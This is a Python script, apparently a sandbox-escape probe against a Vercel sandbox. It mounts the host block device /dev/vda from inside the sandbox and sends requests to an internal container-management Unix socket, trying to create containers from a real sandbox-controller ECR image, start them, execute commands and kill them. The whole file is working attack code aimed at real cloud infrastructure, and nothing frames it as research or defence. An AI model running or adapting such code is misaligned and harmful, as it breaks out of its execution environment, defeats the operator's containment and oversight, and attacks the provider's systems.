# -*- coding: utf-8 -*-
"""vda11_create_real: 用 ECR 镜像名 Create 容器 -> Start -> Exec
1) Create 镜像名变体 (ECR repo:tag / digest)
2) 成功后 Start 容器
3) Exec 命令 (id/uname) + Kill 清理
输出落盘 + 哨兵 V11X_DONE"""
import os, time, socket, ctypes, re

OUT = '/vercel/sandbox/v11x.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=8):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    REPO = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller'
    DIGEST = 'sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

    # P1: Create 镜像名变体
    log('=== P1 Create real image ===')
    cid = None
    for img in ['%s:latest' % REPO, '%s' % REPO, '%s@%s' % (REPO, DIGEST),
                'sandbox-controller:latest', '%s:2026.08.27' % REPO]:
        body = '{"image":"%s"}' % img
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', body, t=10)
        log('create %-90s -> %s | %s' % (img, st, bd[:300].replace('\n', ' ')))
        if 'container_id' in bd or '"id"' in bd:
            m = re.search(r'"(?:container_?id|id)":\s*"([^"]+)"', bd)
            if m:
                cid = m.group(1)
                log('CONTAINER_ID=%s' % cid)
                break
        time.sleep(0.6)

    if not cid:
        log('no container id; trying body with command')
        for img in ['%s:latest' % REPO, '%s' % REPO]:
            for cmd in ['/bin/sh', 'sleep 3600', '/bin/sleep']:
                body = '{"image":"%s","command":"%s"}' % (img, cmd)
                st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', body, t=10)
                log('create %-90s -> %s | %s' % (img + ' cmd=' + cmd, st, bd[:300].replace('\n', ' ')))
                m = re.search(r'"(?:container_?id|id)":\s*"([^"]+)"', bd)
                if m:
                    cid = m.group(1)
                    log('CONTAINER_ID=%s' % cid)
                    break
                time.sleep(0.6)
            if cid:
                break

    # P2: Start
    if cid:
        log('=== P2 Start ===')
        for body in ['{"container_id":"%s"}' % cid, '{"id":"%s"}' % cid, '{}']:
            st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Start', body, t=8)
            log('start %s -> %s | %s' % (body, st, bd[:250].replace('\n', ' ')))
            if 'OK' in bd or 'started' in bd.lower() or st == 'HTTP/1.1 200 OK':
                break
            time.sleep(0.5)

    # P3: Exec
    log('=== P3 Exec ===')
    for body in ['{"command":"id"}',
                 '{"command":"id","container_id":"%s"}' % cid if cid else '{"command":"id"}']:
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Exec', body, t=6)
        log('exec %-60s -> %s | %s' % (body, st, bd[:300].replace('\n', ' ')))
        time.sleep(0.5)

    # P4: Kill 清理
    if cid:
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Kill',
                          '{"container_id":"%s"}' % cid, t=5)
        log('kill -> %s | %s' % (st, bd[:150]))

    log('V11X_DONE')
    f.close()


if __name__ == '__main__':
    main()
